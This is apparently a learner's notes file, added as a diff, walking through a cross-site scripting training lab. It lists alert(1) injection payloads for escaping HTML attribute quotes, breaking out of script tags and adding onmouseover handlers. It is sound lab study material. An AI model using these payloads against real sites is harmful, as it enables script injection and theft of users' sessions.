@@ -1,0 +1,68 @@
+Cross site scripting on Lab 
+
+Lab Link - http://leettime.net/xsslab1/
+
+<script>alert(1)</script>
+browser execute html 
+
+we know that javascript can work with html 
+
+<input type="text" name="name" value=batman></input>
+
+<input type="text" name="name" value=<script>alert(1)</script>></input>
+
+<input type="text" name="name" value=>batman></input>
+
+payload = ><script>alert(1)</script>
+
+
+Challenge 3: 
+
+<input type="text" name="name" value="spiderman"></input>
+
+payload = "><script>alert(1)</script>
+
+
+Challenge 4 : 
+
+<input type="text" name="name" value='ironman'></input>
+
+
+payload = '><script>alert(1)</script>
+
+Challenge 5 : 
+
+<center><script>var search_str="hello";</script>
+
+payload : </script><script>alert(1)</script>
+
+Challege 6 : <center><script>var search_str='hello';</script>
+
+
+Payload = ';</script><script>alert(1)</script>
+
+payload2 : </script><script>alert(1)</script>
+
+Challenge 7 : 
+
+keyboard input will become a string response you can try to give input through mouse 
+
+onmouseover=alert(1);
+
+'onmouseover='alert(1);
+
+if your input correctly placed outside of any html tag then js will execute there 
+
+"onmouseover="alert(1);
+
+
+
+
+
+
+
+
+
+
+
+
